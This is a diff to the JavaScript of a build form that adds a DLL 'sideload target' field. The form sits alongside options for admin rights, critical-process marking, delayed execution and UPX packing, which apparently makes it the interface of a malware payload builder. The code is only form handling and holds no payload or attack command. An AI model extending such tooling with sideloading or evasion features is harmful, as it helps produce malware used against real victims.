@@ -551,6 +551,19 @@ buildProviderSelect?.addEventListener("change", () => {
   saveFormSettings();
 });
 
+const outputExtensionSelect = document.getElementById("output-extension");
+const sideloadSection = document.getElementById("sideload-target-section");
+function updateSideloadSection() {
+  if (!sideloadSection) return;
+  const isDll = outputExtensionSelect?.value === ".dll";
+  sideloadSection.classList.toggle("hidden", !isDll);
+}
+outputExtensionSelect?.addEventListener("change", () => {
+  updateSideloadSection();
+  saveFormSettings();
+});
+updateSideloadSection();
+
 function setBuildField(field, value) {
   const fieldMap = {
     buildProvider: "#build-provider",
@@ -2207,6 +2220,7 @@ form?.addEventListener("submit", async (e) => {
   const requireAdmin = form.querySelector('input[name="require-admin"]')?.checked || false;
   const criticalProcess = form.querySelector('input[name="critical-process"]')?.checked || false;
   const outputExtension = form.querySelector("#output-extension")?.value || ".exe";
+  const sideloadTarget = outputExtension === ".dll" ? (form.querySelector("#sideload-target")?.value || "") : "";
   const sleepSecondsRaw = parseInt(form.querySelector("#sleep-seconds")?.value || "0", 10);
   const sleepSeconds = !isNaN(sleepSecondsRaw) && sleepSecondsRaw > 0 ? sleepSecondsRaw : 0;
 
@@ -2249,6 +2263,7 @@ form?.addEventListener("submit", async (e) => {
     requireAdmin,
     criticalProcess,
     outputExtension,
+    sideloadTarget: sideloadTarget || undefined,
     sleepSeconds: sleepSeconds > 0 ? sleepSeconds : undefined,
     iconBase64: pendingIconBase64 || undefined,
     enableUpx: form.querySelector('input[name="enable-upx"]')?.checked || false,
